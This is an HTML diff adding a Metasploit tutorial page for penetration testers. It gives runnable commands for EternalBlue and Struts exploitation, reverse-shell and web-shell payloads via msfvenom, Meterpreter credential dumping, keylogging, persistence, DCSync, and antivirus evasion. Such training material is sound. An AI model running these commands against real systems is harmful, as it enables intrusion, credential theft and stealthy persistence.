+      <div class="vcdesc">Non-exploitation modules covering scanning, enumeration, fuzzing, brute-force, spoofing, and protocol analysis. Used for reconnaissance and vulnerability identification before launching exploits. Hundreds of modules covering SMB, SSH, HTTP, FTP, SNMP, LDAP, databases, and wireless protocols.</div>
+      <span class="vtag vt-c">RECON</span>
+    </div>
+    <div class="vc">
+      <span class="vcn">04</span>
+      <div class="vcname">Post Modules</div>
+      <div class="vcdesc">Executed after initial access is established. Provide capabilities for privilege escalation, persistence, credential harvesting, lateral movement, data exfiltration, and situational awareness. Run against an established Meterpreter session rather than directly against a target — operate entirely within the attacker's established access context.</div>
+      <span class="vtag vt-g">POST-EXPLOIT</span>
+    </div>
+    <div class="vc">
+      <span class="vcn">05</span>
+      <div class="vcname">Encoders</div>
+      <div class="vcdesc">Transform payload byte sequences to avoid signature-based detection by antivirus engines. The most well-known is Shikata Ga Nai (x86/sgn) — a polymorphic XOR additive feedback encoder that produces a different output on each generation. Modern EDR solutions are largely immune to encoding alone; encoding must be combined with other evasion techniques.</div>
+      <span class="vtag vt-o">EVASION</span>
+    </div>
+    <div class="vc">
+      <span class="vcn">06</span>
+      <div class="vcname">NOPs &amp; Evasion</div>
+      <div class="vcdesc">NOP (No-Operation) sleds pad shellcode to increase exploit reliability by giving the instruction pointer a larger landing zone. Dedicated evasion modules generate payloads specifically designed to bypass modern endpoint detection and response (EDR) products through techniques beyond simple encoding.</div>
+      <span class="vtag vt-o">EVASION</span>
+    </div>
+  </div>
+</section>
+
+<div class="div"></div>
+
+<!-- ══════════════════════════════════
+     03 — SETUP & CORE COMMANDS
+══════════════════════════════════ -->
+<section class="sec rv" id="setup">
+  <div class="sec-hd">
+    <span class="sec-n">03 //</span>
+    <h2 class="sec-t">Installation &amp; Core Command Reference<span class="tw-cursor"></span></h2>
+    <div class="sec-ln"></div>
+  </div>
+
+  <div class="panel rv-l">
+    <p>Metasploit comes pre-installed on Kali Linux and Parrot OS — the fastest path to a working environment. For custom builds, the official installer script handles all dependencies on Debian/Ubuntu-based systems. The framework is database-driven (PostgreSQL) for storing hosts, services, vulnerabilities, credentials, and loot — always start the database before launching msfconsole for a fully functional workspace.</p>
+  </div>
+
+  <div class="cb rv" data-l="Installation — Ubuntu/Debian &amp; Kali Linux">
+    <code><span class="cmt"># On Kali Linux — Metasploit is pre-installed, just update it</span>
+<span class="cmd">sudo apt update</span> && <span class="cmd">sudo apt install</span> metasploit-framework
+
+<span class="cmt"># Manual install on Ubuntu/Debian via Rapid7's official installer</span>
+<span class="cmd">curl</span> https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb \
+  > msfinstall && <span class="cmd">chmod</span> 755 msfinstall && <span class="cmd">./msfinstall</span>
+
+<span class="cmt"># Start PostgreSQL database (required for full workspace functionality)</span>
+<span class="cmd">sudo systemctl start</span> postgresql
+<span class="cmd">sudo msfdb init</span>        <span class="cmt"># Initialise the MSF database</span>
+<span class="cmd">sudo msfdb status</span>      <span class="cmt"># Verify database is connected</span>
+
+<span class="cmt"># Launch the Metasploit console</span>
+<span class="cmd">msfconsole</span>
+
+<span class="cmt"># Keep framework up to date</span>
+<span class="cmd">msfupdate</span>             <span class="cmt"># Or: apt upgrade metasploit-framework</span></code>
+  </div>
+
+  <div class="panel rv">
+    <div class="panel-t">Essential msfconsole Command Reference</div>
+    <table class="ctbl">
+      <thead><tr><th>Command</th><th>Context</th><th>Description</th></tr></thead>
+      <tbody>
+        <tr><td>search &lt;term&gt;</td><td>Global</td><td>Search all modules by name, CVE, platform, type, or author</td></tr>
+        <tr><td>use &lt;module/path&gt;</td><td>Global</td><td>Select a module — exploit, auxiliary, post, or payload</td></tr>
+        <tr><td>info</td><td>Module</td><td>Show full module details — description, options, targets, references</td></tr>
+        <tr><td>show options</td><td>Module</td><td>List all configurable options and their current values</td></tr>
+        <tr><td>show payloads</td><td>Exploit</td><td>List all compatible payloads for the selected exploit</td></tr>
+        <tr><td>set &lt;OPTION&gt; &lt;value&gt;</td><td>Module</td><td>Set a module option (RHOSTS, LHOST, PAYLOAD, etc.)</td></tr>
+        <tr><td>setg &lt;OPTION&gt; &lt;value&gt;</td><td>Global</td><td>Set a global option that persists across module changes</td></tr>
+        <tr><td>check</td><td>Exploit</td><td>Check if target is vulnerable without exploiting (where supported)</td></tr>
+        <tr><td>run / exploit</td><td>Module</td><td>Execute the current module</td></tr>
+        <tr><td>exploit -j</td><td>Exploit</td><td>Run exploit as background job</td></tr>
+        <tr><td>sessions -l</td><td>Global</td><td>List all active sessions (Meterpreter, shell, etc.)</td></tr>
+        <tr><td>sessions -i &lt;ID&gt;</td><td>Global</td><td>Interact with a specific session</td></tr>
+        <tr><td>sessions -u &lt;ID&gt;</td><td>Global</td><td>Upgrade a shell session to Meterpreter</td></tr>
+        <tr><td>jobs -l</td><td>Global</td><td>List background jobs</td></tr>
+        <tr><td>db_nmap &lt;options&gt;</td><td>Global</td><td>Run Nmap and automatically import results into MSF database</td></tr>
+        <tr><td>hosts / services</td><td>Global</td><td>Query discovered hosts and services from the database</td></tr>
+        <tr><td>vulns</td><td>Global</td><td>List vulnerabilities identified during the engagement</td></tr>
+        <tr><td>creds</td><td>Global</td><td>List harvested credentials stored in the workspace</td></tr>
+        <tr><td>workspace -a &lt;name&gt;</td><td>Global</td><td>Create a new workspace to organise separate engagements</td></tr>
+        <tr><td>back</td><td>Module</td><td>Exit current module context</td></tr>
+      </tbody>
+    </table>
+  </div>
+</section>
+
+<div class="div"></div>
+
+<!-- ══════════════════════════════════
+     04 — RECON & SCANNING
+══════════════════════════════════ -->
+<section class="sec rv" id="recon">
+  <div class="sec-hd">
+    <span class="sec-n">04 //</span>
+    <h2 class="sec-t">Reconnaissance &amp; Scanning with MSF<span class="tw-cursor"></span></h2>
+    <div class="sec-ln"></div>
+  </div>
+
+  <div class="panel rv-l">
+    <p>Metasploit's auxiliary scanner modules provide comprehensive network reconnaissance capabilities — directly integrated with the MSF database so discovered hosts, services, and vulnerabilities are automatically stored and available for exploit module targeting. The <code style="color:var(--c);font-family:var(--mono)">db_nmap</code> command is the fastest path to populating the database: it runs a standard Nmap scan and imports all results automatically, making discovered hosts immediately targetable by exploit modules via <code style="color:var(--c);font-family:var(--mono)">RHOSTS</code>.</p>
+  </div>
+
+  <div class="tgrid rv">
+    <div class="tc"><div class="tcname">auxiliary/scanner/portscan/tcp</div><span class="tctag">Port Scanner</span><div class="tcdesc">Multi-threaded TCP port scanner — faster than Nmap for large subnet sweeps when imported results are not required</div></div>
+    <div class="tc"><div class="tcname">auxiliary/scanner/smb/smb_ms17_010</div><span class="tctag">Vuln Scanner</span><div class="tcdesc">Checks targets for the EternalBlue SMB vulnerability (MS17-010) without attempting exploitation — safe pre-check</div></div>
+    <div class="tc"><div class="tcname">auxiliary/scanner/ssh/ssh_version</div><span class="tctag">Service ID</span><div class="tcdesc">Fingerprints SSH service versions across a subnet — identifies outdated OpenSSH versions with known CVEs</div></div>
+    <div class="tc"><div class="tcname">auxiliary/scanner/http/http_version</div><span class="tctag">Web Recon</span><div class="tcdesc">Identifies web server type and version across multiple targets — useful for mapping the web attack surface</div></div>
+    <div class="tc"><div class="tcname">auxiliary/scanner/ftp/anonymous</div><span class="tctag">Auth Check</span><div class="tcdesc">Tests for anonymous FTP access — a common misconfiguration that exposes sensitive files without credentials</div></div>
+    <div class="tc"><div class="tcname">auxiliary/scanner/snmp/snmp_enum</div><span class="tctag">Enumeration</span><div class="tcdesc">Extracts system information, network interfaces, running processes, and open ports via SNMP community strings</div></div>
+  </div>
+
+  <div class="cb rv" data-l="MSF — Database-Driven Network Reconnaissance">
+    <code><span class="cmt"># Create a dedicated workspace for this engagement</span>
+<span class="cmd">workspace</span> <span class="flag">-a</span> client_engagement_2024
+
+<span class="cmt"># db_nmap: runs Nmap AND imports results into MSF database automatically</span>
+<span class="cmd">db_nmap</span> <span class="flag">-sV -sC -O --open -p-</span> <span class="prm">192.168.1.0/24</span>
+
+<span class="cmt"># Query discovered hosts and services from database</span>
+<span class="cmd">hosts</span>                          <span class="cmt"># List all discovered hosts</span>
+<span class="cmd">services</span>                       <span class="cmt"># List all discovered services</span>
+<span class="cmd">services</span> <span class="flag">-p 445</span>               <span class="cmt"># Filter: hosts with port 445 open (SMB)</span>
+<span class="cmd">services</span> <span class="flag">-p 80,443 -R</span>         <span class="cmt"># Set RHOSTS to all hosts with web services</span>
+
+<span class="cmt"># Use MSF TCP port scanner across a subnet</span>
+<span class="cmd">use</span> auxiliary/scanner/portscan/tcp
+<span class="cmd">set</span> RHOSTS <span class="prm">192.168.1.0/24</span>
+<span class="cmd">set</span> PORTS <span class="num">22,80,443,445,3389,8080</span>
+<span class="cmd">set</span> THREADS <span class="num">50</span>
+<span class="cmd">run</span>
+
+<span class="cmt"># Check entire subnet for EternalBlue vulnerability (safe — no exploitation)</span>
+<span class="cmd">use</span> auxiliary/scanner/smb/smb_ms17_010
+<span class="cmd">set</span> RHOSTS <span class="prm">192.168.1.0/24</span>
+<span class="cmd">set</span> THREADS <span class="num">20</span>
+<span class="cmd">run</span></code>
+  </div>
+</section>
+
+<div class="div"></div>
+
+<!-- ══════════════════════════════════
+     05 — EXPLOITATION
+══════════════════════════════════ -->
+<section class="sec rv" id="exploit">
+  <div class="sec-hd">
+    <span class="sec-n">05 //</span>
+    <h2 class="sec-t">Exploitation Workflows<span class="tw-cursor"></span></h2>
+    <div class="sec-ln"></div>
+  </div>
+
+  <div class="panel rv-l">
+    <p>Metasploit's exploitation workflow follows a consistent pattern regardless of the target or vulnerability: search for the right module, select it, configure RHOSTS/LHOST/LPORT, select a compatible payload, optionally run the check command, then execute. The discipline lies in understanding which exploits apply to which service versions, which payloads are appropriate for the target OS and architecture, and how to handle failures gracefully without impacting production systems.</p>
+  </div>
+
+  <div class="atk rv">
+    <div class="atk-name">⟩ EternalBlue — MS17-010 SMB Exploitation</div>
+    <div class="atk-body">EternalBlue (CVE-2017-0144) is a vulnerability in Microsoft's SMBv1 protocol originally developed by the NSA and leaked by the Shadow Brokers in 2017. It allows remote code execution on unpatched Windows systems without authentication — one of the most impactful vulnerabilities in Microsoft's history, responsible for both the WannaCry and NotPetya attacks. The MSF module provides a reliable, weaponised implementation against Windows 7 through Server 2008 R2.</div>
+    <div class="cb" data-l="Exploit — EternalBlue (MS17-010) Step by Step">
+      <code><span class="cmt"># Step 1: Search for the EternalBlue exploit module</span>
+<span class="cmd">search</span> ms17_010
+
+<span class="cmt"># Step 2: Select the EternalBlue exploit</span>
+<span class="cmd">use</span> exploit/windows/smb/ms17_010_eternalblue
+
+<span class="cmt"># Step 3: Review required options</span>
+<span class="cmd">show options</span>
+
+<span class="cmt"># Step 4: Set the target IP address</span>
+<span class="cmd">set</span> RHOSTS <span class="prm">192.168.1.5</span>
+
+<span class="cmt"># Step 5: Select a Meterpreter payload (reverse TCP — target calls back to us)</span>
+<span class="cmd">set</span> PAYLOAD windows/x64/meterpreter/reverse_tcp
+
+<span class="cmt"># Step 6: Set attacker IP and listening port</span>
+<span class="cmd">set</span> LHOST <span class="prm">192.168.1.100</span>
+<span class="cmd">set</span> LPORT <span class="num">4444</span>
+
+<span class="cmt"># Step 7 (Optional): Verify target is vulnerable without exploiting</span>
+<span class="cmd">check</span>
+
+<span class="cmt"># Step 8: Launch the exploit</span>
+<span class="cmd">exploit</span>
+
+<span class="cmt"># Success output:
+# [*] Started reverse TCP handler on 192.168.1.100:4444
+# [+] 192.168.1.5:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+# [+] 192.168.1.5:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=
+# [*] Meterpreter session 1 opened</span></code>
+    </div>
+  </div>
+
+  <div class="atk rv">
+    <div class="atk-name">⟩ Web Application Exploitation</div>
+    <div class="atk-body">Metasploit covers a wide range of web application vulnerabilities — from Apache Struts (CVE-2017-5638, used in the Equifax breach) to PHP file upload vulnerabilities, WordPress plugin exploits, and Tomcat manager authentication bypass. Web application exploits typically require additional options like TARGETURI, VHOST, and web-specific SSL settings. Always use <code style="color:var(--c);font-family:var(--mono)">info</code> to understand what each module requires before running it.</div>
+    <div class="cb" data-l="Web Exploit — Apache Struts (CVE-2017-5638)">
+      <code><span class="cmt"># Search for the Struts exploit</span>
+<span class="cmd">search</span> CVE-2017-5638
+
+<span class="cmt"># Select the Struts 2 REST plugin RCE module</span>
+<span class="cmd">use</span> exploit/multi/http/struts2_content_type_ognl
+
+<span class="cmt"># Review full module info including required options and targets</span>
+<span class="cmd">info</span>
+
+<span class="cmt"># Configure target</span>
+<span class="cmd">set</span> RHOSTS <span class="prm">target.example.com</span>
+<span class="cmd">set</span> RPORT <span class="num">8080</span>
+<span class="cmd">set</span> TARGETURI <span class="str">/struts2-showcase/index.action</span>
+<span class="cmd">set</span> SSL <span class="kw">false</span>
+
+<span class="cmt"># Select a Linux payload (Struts usually runs on Linux/Java)</span>
+<span class="cmd">set</span> PAYLOAD linux/x64/meterpreter/reverse_tcp
+<span class="cmd">set</span> LHOST <span class="prm">192.168.1.100</span>
+<span class="cmd">set</span> LPORT <span class="num">4444</span>
+
+<span class="cmt"># Run exploit</span>
+<span class="cmd">exploit</span></code>
+    </div>
+  </div>
+
+  <div class="atk rv">
+    <div class="atk-name">⟩ Multi-Handler — Catching Reverse Shells</div>
+    <div class="atk-body">When a payload is delivered via a method outside of Metasploit (email attachment, USB drop, web download), the <code style="color:var(--c);font-family:var(--mono)">exploit/multi/handler</code> module acts as the receiving end. It listens for the incoming connection from the payload, establishes the Meterpreter session, and integrates it fully with the MSF workspace. Always run multi/handler as a background job (<code style="color:var(--c);font-family:var(--mono)">exploit -j</code>) to keep msfconsole interactive while waiting for callbacks.</div>
+    <div class="cb" data-l="multi/handler — Catching Payload Callbacks">
+      <code><span class="cmt"># Set up a listener to catch reverse shell / Meterpreter callbacks</span>
+<span class="cmd">use</span> exploit/multi/handler
+
+<span class="cmt"># Must match exactly the payload you generated with msfvenom</span>
+<span class="cmd">set</span> PAYLOAD windows/x64/meterpreter/reverse_tcp
+<span class="cmd">set</span> LHOST <span class="prm">192.168.1.100</span>   <span class="cmt"># Your IP — target will connect back to this</span>
+<span class="cmd">set</span> LPORT <span class="num">4444</span>
+
+<span class="cmt"># Run as a background job — keeps console interactive</span>
+<span class="cmd">exploit</span> <span class="flag">-j</span>
+
+<span class="cmt"># Once a target executes the payload, session appears:
+# [*] Meterpreter session 1 opened (192.168.1.100:4444 → 192.168.1.50:55234)
+
+# List and interact with sessions</span>
+<span class="cmd">sessions</span> <span class="flag">-l</span>
+<span class="cmd">sessions</span> <span class="flag">-i 1</span>            <span class="cmt"># Interact with session 1</span>
+
+<span class="cmt"># Upgrade a basic shell session to Meterpreter</span>
+<span class="cmd">sessions</span> <span class="flag">-u 1</span></code>
+    </div>
+  </div>
+</section>
+
+<div class="div"></div>
+
+<!-- ══════════════════════════════════
+     06 — POST-EXPLOITATION
+══════════════════════════════════ -->
+<section class="sec rv" id="post">
+  <div class="sec-hd">
+    <span class="sec-n">06 //</span>
+    <h2 class="sec-t">Meterpreter &amp; Post-Exploitation<span class="tw-cursor"></span></h2>
+    <div class="sec-ln"></div>
+  </div>
+
+  <div class="panel rv-l">
+    <p>Meterpreter is Metasploit's flagship post-exploitation agent — a reflective DLL injected directly into memory without writing any files to disk, making it significantly harder to detect than file-based agents. It provides an extensible, encrypted communication channel with capabilities spanning the entire post-exploitation kill chain: privilege escalation, credential harvesting, keylogging, screenshot capture, filesystem access, pivoting, and persistence — all controllable from a single interactive session.</p>
+  </div>
+
+  <div class="alert al-i rv">
+    <span class="al-ic">[ i ]</span>
+    <p class="al-tx">Meterpreter communicates over an <strong>encrypted TLS channel</strong> by default and operates entirely in memory — leaving no executable on disk. This makes it substantially harder to detect via filesystem scanning compared to traditional backdoors, though modern EDR solutions detect it via behavioural analysis of the injection pattern.</p>
+  </div>
+
+  <div class="mgrid-post rv">
+    <div class="mpc">
+      <span class="mpc-cat">System Information</span>
+      <div class="mpc-cmd">sysinfo</div>
+      <div class="mpc-desc">OS version, hostname, architecture, and logged-in users</div>
+    </div>
+    <div class="mpc">
+      <span class="mpc-cat">Identity</span>
+      <div class="mpc-cmd">getuid / getpid</div>
+      <div class="mpc-desc">Current user context and Meterpreter process ID</div>
+    </div>
+    <div class="mpc">
+      <span class="mpc-cat">Privilege Escalation</span>
+      <div class="mpc-cmd">getsystem</div>
+      <div class="mpc-desc">Attempt automatic privilege escalation to SYSTEM via multiple techniques</div>
+    </div>
+    <div class="mpc">
+      <span class="mpc-cat">Credentials</span>
+      <div class="mpc-cmd">hashdump</div>
+      <div class="mpc-desc">Dump all Windows SAM hashes (NTLM) — requires SYSTEM privileges</div>
+    </div>
+    <div class="mpc">
+      <span class="mpc-cat">Keylogging</span>
+      <div class="mpc-cmd">keyscan_start / dump</div>
+      <div class="mpc-desc">Start keystroke capture, then dump all captured keystrokes</div>
+    </div>
+    <div class="mpc">
+      <span class="mpc-cat">Screenshots</span>
+      <div class="mpc-cmd">screenshot</div>
+      <div class="mpc-desc">Capture current desktop screenshot of the target system</div>
+    </div>
+    <div class="mpc">
+      <span class="mpc-cat">Process Migration</span>
+      <div class="mpc-cmd">migrate &lt;PID&gt;</div>
+      <div class="mpc-desc">Move Meterpreter into another process — improves stability and evades detection</div>
+    </div>
+    <div class="mpc">
+      <span class="mpc-cat">Filesystem</span>
+      <div class="mpc-cmd">upload / download</div>
+      <div class="mpc-desc">Transfer files bidirectionally between attacker and target</div>
+    </div>
+    <div class="mpc">
+      <span class="mpc-cat">Pivoting</span>
+      <div class="mpc-cmd">route add / portfwd</div>
+      <div class="mpc-desc">Route traffic through the compromised host to access internal network segments</div>
+    </div>
+  </div>
+
+  <div class="cb rv" data-l="Meterpreter — Complete Post-Exploitation Workflow">
+    <code><span class="cmt"># After landing a Meterpreter session — initial situational awareness</span>
+<span class="cmd">sysinfo</span>                         <span class="cmt"># OS, hostname, architecture</span>
+<span class="cmd">getuid</span>                          <span class="cmt"># Current user context</span>
+<span class="cmd">getpid</span>                          <span class="cmt"># Meterpreter process ID</span>
+<span class="cmd">ps</span>                              <span class="cmt"># List running processes</span>
+
+<span class="cmt"># Migrate to a stable, trusted process (e.g., explorer.exe) to survive logout</span>
+<span class="cmd">migrate</span> <span class="flag">-N</span> explorer.exe
+
+<span class="cmt"># Privilege escalation — attempt all techniques automatically</span>
+<span class="cmd">getsystem</span>
+
+<span class="cmt"># Dump all local Windows account hashes (requires SYSTEM)</span>
+<span class="cmd">hashdump</span>
+<span class="cmt"># Output: Administrator:500:aad3b435...:8846f7eaee8fb117...:::
+# Pass these hashes to hashcat or use them directly in Pass-the-Hash</span>
+
+<span class="cmt"># Start keylogger in the background</span>
+<span class="cmd">keyscan_start</span>
+<span class="cmt"># ... wait for user activity ...</span>
+<span class="cmd">keyscan_dump</span>
+<span class="cmd">keyscan_stop</span>
+
+<span class="cmt"># Establish persistence — survive reboots via registry run key</span>
+<span class="cmd">run</span> persistence <span class="flag">-U -i 30 -p 4444 -r</span> <span class="prm">192.168.1.100</span>
+
+<span class="cmt"># Set up a pivot — route to an internal subnet through this host</span>
+<span class="cmd">background</span>                      <span class="cmt"># Send session to background</span>
+<span class="cmd">route add</span> <span class="prm">10.10.10.0/24</span> <span class="num">1</span>      <span class="cmt"># Route 10.10.10.0/24 through session 1</span>
+<span class="cmt"># Now MSF modules can reach the internal subnet via the pivot</span></code>
+  </div>
+
+  <div class="cb rv" data-l="Post Modules — Automated Post-Exploitation">
+    <code><span class="cmt"># Background the current session first</span>
+<span class="cmd">background</span>
+
+<span class="cmt"># Run Windows credential harvesting module against session 1</span>
+<span class="cmd">use</span> post/windows/gather/credentials/credential_collector
+<span class="cmd">set</span> SESSION <span class="num">1</span>
+<span class="cmd">run</span>
+
+<span class="cmt"># Enumerate installed applications</span>
+<span class="cmd">use</span> post/windows/gather/enum_applications
+<span class="cmd">set</span> SESSION <span class="num">1</span>
+<span class="cmd">run</span>
+
+<span class="cmt"># Check for local privilege escalation opportunities</span>
+<span class="cmd">use</span> post/multi/recon/local_exploit_suggester
+<span class="cmd">set</span> SESSION <span class="num">1</span>
+<span class="cmd">run</span>
+
+<span class="cmt"># Dump Active Directory credentials via Kiwi (Mimikatz in Meterpreter)</span>
+<span class="cmd">load kiwi</span>
+<span class="cmd">lsa_dump_sam</span>                    <span class="cmt"># Dump SAM database</span>
+<span class="cmd">lsa_dump_secrets</span>                <span class="cmt"># Dump LSA secrets</span>
+<span class="cmd">dcsync_ntlm krbtgt</span>              <span class="cmt"># DCSync attack — dump krbtgt hash</span></code>
+  </div>
+</section>
+
+<div class="div"></div>
+
+<!-- ══════════════════════════════════
+     07 — MSFVENOM PAYLOAD GENERATION
+══════════════════════════════════ -->
+<section class="sec rv" id="payloads">
+  <div class="sec-hd">
+    <span class="sec-n">07 //</span>
+    <h2 class="sec-t">msfvenom — Custom Payload Generation<span class="tw-cursor"></span></h2>
+    <div class="sec-ln"></div>
+  </div>
+
+  <div class="panel rv-l">
+    <p><strong style="color:var(--t1)">msfvenom</strong> is Metasploit's standalone payload generator and encoder — the replacement for the legacy msfpayload and msfencode tools. It generates standalone payload executables, shellcode in numerous formats, and language-specific shellcode arrays for embedding in custom exploits. The generated payload must always be paired with a matching <code style="color:var(--c);font-family:var(--mono)">multi/handler</code> listener using the same payload type, LHOST, and LPORT values.</p>
+  </div>
+
+  <div class="cb rv" data-l="msfvenom — Cross-Platform Payload Generation">
+    <code><span class="cmt"># List all available payloads</span>
+<span class="cmd">msfvenom</span> <span class="flag">-l payloads</span>
+
+<span class="cmt"># Windows — 64-bit Meterpreter reverse TCP executable</span>
+<span class="cmd">msfvenom</span> <span class="flag">-p</span> windows/x64/meterpreter/reverse_tcp \
+  LHOST=<span class="prm">192.168.1.100</span> LPORT=<span class="num">4444</span> \
+  <span class="flag">-f exe -o</span> payload_win.exe
+
+<span class="cmt"># Linux — 64-bit Meterpreter reverse TCP ELF binary</span>
+<span class="cmd">msfvenom</span> <span class="flag">-p</span> linux/x64/meterpreter/reverse_tcp \
+  LHOST=<span class="prm">192.168.1.100</span> LPORT=<span class="num">4444</span> \
+  <span class="flag">-f elf -o</span> payload_linux.elf
+
+<span class="cmt"># macOS — reverse shell payload</span>
+<span class="cmd">msfvenom</span> <span class="flag">-p</span> osx/x64/meterpreter/reverse_tcp \
+  LHOST=<span class="prm">192.168.1.100</span> LPORT=<span class="num">4444</span> \
+  <span class="flag">-f macho -o</span> payload_macos
+
+<span class="cmt"># Android — APK with embedded reverse shell</span>
+<span class="cmd">msfvenom</span> <span class="flag">-p</span> android/meterpreter/reverse_tcp \
+  LHOST=<span class="prm">192.168.1.100</span> LPORT=<span class="num">4444</span> \
+  <span class="flag">-f apk -o</span> payload.apk
+
+<span class="cmt"># PowerShell payload — for script-based delivery (Windows)</span>
+<span class="cmd">msfvenom</span> <span class="flag">-p</span> windows/x64/meterpreter/reverse_tcp \
+  LHOST=<span class="prm">192.168.1.100</span> LPORT=<span class="num">4444</span> \
+  <span class="flag">-f psh -o</span> payload.ps1
+
+<span class="cmt"># Raw shellcode — embed in a custom exploit (C array format)</span>
+<span class="cmd">msfvenom</span> <span class="flag">-p</span> windows/x64/meterpreter/reverse_tcp \
+  LHOST=<span class="prm">192.168.1.100</span> LPORT=<span class="num">4444</span> \
+  <span class="flag">-f c</span>          <span class="cmt"># Output as C byte array</span></code>
+  </div>
+
+  <div class="cb rv" data-l="msfvenom — Web Shell Generation">
+    <code><span class="cmt"># PHP web shell — for web server compromise (upload via file upload vulnerability)</span>
+<span class="cmd">msfvenom</span> <span class="flag">-p</span> php/meterpreter/reverse_tcp \
+  LHOST=<span class="prm">192.168.1.100</span> LPORT=<span class="num">4444</span> \
+  <span class="flag">-f raw -o</span> shell.php
+
+<span class="cmt"># JSP web shell — Java application servers (Tomcat, JBoss)</span>
+<span class="cmd">msfvenom</span> <span class="flag">-p</span> java/jsp_shell_reverse_tcp \
+  LHOST=<span class="prm">192.168.1.100</span> LPORT=<span class="num">4444</span> \
+  <span class="flag">-f raw -o</span> shell.jsp
+
+<span class="cmt"># ASP.NET web shell — IIS servers</span>
+<span class="cmd">msfvenom</span> <span class="flag">-p</span> windows/x64/meterpreter/reverse_tcp \
+  LHOST=<span class="prm">192.168.1.100</span> LPORT=<span class="num">4444</span> \
+  <span class="flag">-f aspx -o</span> shell.aspx
+
+<span class="cmt"># Python payload — cross-platform delivery via Python interpreter</span>
+<span class="cmd">msfvenom</span> <span class="flag">-p</span> cmd/unix/reverse_python \
+  LHOST=<span class="prm">192.168.1.100</span> LPORT=<span class="num">4444</span> \
+  <span class="flag">-f raw -o</span> shell.py</code>
+  </div>
+</section>
+
+<div class="div"></div>
+
+<!-- ══════════════════════════════════
+     08 — AV EVASION
+══════════════════════════════════ -->
+<section class="sec rv" id="evasion">
+  <div class="sec-hd">
+    <span class="sec-n">08 //</span>
+    <h2 class="sec-t">AV Evasion &amp; Best Practices<span class="tw-cursor"></span></h2>
+    <div class="sec-ln"></div>
+  </div>
+
+  <div class="panel rv-l">
+    <p>Raw Meterpreter payloads are immediately detected by all major antivirus and EDR solutions — their signatures have been known for over a decade. In modern penetration testing engagements, AV/EDR evasion is not optional; it is a mandatory component of realistic attack simulation. The techniques below range from simple encoding (lowest efficacy against modern defences) through HTTPS payloads, custom shellcode loaders, and process injection — each representing a more sophisticated evasion layer.</p>
+  </div>
+
+  <div class="atk rv">
+    <div class="atk-name">⟩ Encoding with Shikata Ga Nai</div>
+    <div class="atk-body">The <strong>x86/shikata_ga_nai</strong> (SGN) encoder is a polymorphic XOR additive feedback encoder — it produces different output bytes on every generation while maintaining the same decoded shellcode at runtime. Multiple encoding iterations increase the unique byte sequence, but modern AV solutions detect the decoder stub pattern regardless of iteration count. Encoding alone is insufficient against any modern endpoint security product — it should always be combined with additional techniques.</div>
+    <div class="cb" data-l="msfvenom — Encoding with Shikata Ga Nai">
+      <code><span class="cmt"># Single encoding pass — minimal evasion</span>
+<span class="cmd">msfvenom</span> <span class="flag">-p</span> windows/meterpreter/reverse_tcp \
+  LHOST=<span class="prm">192.168.1.100</span> LPORT=<span class="num">4444</span> \
+  <span class="flag">-e</span> x86/shikata_ga_nai \
+  <span class="flag">-f exe -o</span> encoded_single.exe
+
+<span class="cmt"># Multiple encoding iterations — each pass re-encodes the output
+# More iterations = more unique bytes, but same detection rate vs modern AV</span>
+<span class="cmd">msfvenom</span> <span class="flag">-p</span> windows/meterpreter/reverse_tcp \
+  LHOST=<span class="prm">192.168.1.100</span> LPORT=<span class="num">4444</span> \
+  <span class="flag">-e</span> x86/shikata_ga_nai <span class="flag">-i 10</span> \
+  <span class="flag">-f exe -o</span> encoded_x10.exe
+
+<span class="cmt"># Chain multiple encoders — apply different encoders sequentially</span>
+<span class="cmd">msfvenom</span> <span class="flag">-p</span> windows/meterpreter/reverse_tcp \
+  LHOST=<span class="prm">192.168.1.100</span> LPORT=<span class="num">4444</span> \
+  <span class="flag">-e</span> x86/shikata_ga_nai <span class="flag">-e</span> x86/countdown <span class="flag">-e</span> x86/alpha_mixed \
+  <span class="flag">-f exe -o</span> multi_encoded.exe</code>
+    </div>
+  </div>
+
+  <div class="atk rv">
+    <div class="atk-name">⟩ HTTPS Payloads — Encrypted C2 Communication</div>
+    <div class="atk-body">Switching from <code style="color:var(--c);font-family:var(--mono)">reverse_tcp</code> to <code style="color:var(--c);font-family:var(--mono)">reverse_https</code> encrypts all command-and-control traffic in standard TLS, making it indistinguishable from regular HTTPS web traffic to network monitoring tools. The payload blends into normal web browsing traffic, bypasses many network-level detection systems, and operates comfortably through corporate proxies and firewalls that permit outbound HTTPS on port 443.</div>
+    <div class="cb" data-l="msfvenom — HTTPS Encrypted C2 Payload">
+      <code><span class="cmt"># Generate HTTPS reverse shell — C2 traffic encrypted in TLS</span>
+<span class="cmd">msfvenom</span> <span class="flag">-p</span> windows/x64/meterpreter/reverse_https \
+  LHOST=<span class="prm">192.168.1.100</span> LPORT=<span class="num">443</span> \
+  <span class="flag">-f exe -o</span> https_payload.exe
+
+<span class="cmt"># Configure multi/handler to receive HTTPS callbacks</span>
+<span class="cmd">use</span> exploit/multi/handler
+<span class="cmd">set</span> PAYLOAD windows/x64/meterpreter/reverse_https
+<span class="cmd">set</span> LHOST <span class="prm">192.168.1.100</span>
+<span class="cmd">set</span> LPORT <span class="num">443</span>
+<span class="cmd">exploit</span> <span class="flag">-j</span>
+
+<span class="cmt"># Use a legitimate-looking domain for C2 (domain fronting concept)
+# Further blend traffic by setting LURI to a believable path</span>
+<span class="cmd">set</span> LURI <span class="str">/api/v2/update</span></code>
+    </div>
+  </div>
+
+  <div class="panel rv">
+    <div class="panel-t">Best Practices &amp; Operational Security</div>
+    <ul class="chk">
+      <li><span class="chk-i"></span><span><strong>Always obtain written authorisation</strong> — confirm scope, target IP ranges, permitted techniques, and escalation procedures in writing before any engagement</span></li>
+      <li><span class="chk-i"></span><span><strong>Keep Metasploit updated</strong> — run <code style="color:var(--c);font-family:var(--mono)">msfupdate</code> or <code style="color:var(--c);font-family:var(--mono)">apt upgrade metasploit-framework</code> before every engagement to ensure you have the latest exploit modules and bug fixes</span></li>
+      <li><span class="chk-i"></span><span><strong>Use workspaces</strong> — create a dedicated MSF workspace per engagement with <code style="color:var(--c);font-family:var(--mono)">workspace -a client_name</code> to prevent data contamination between engagements</span></li>
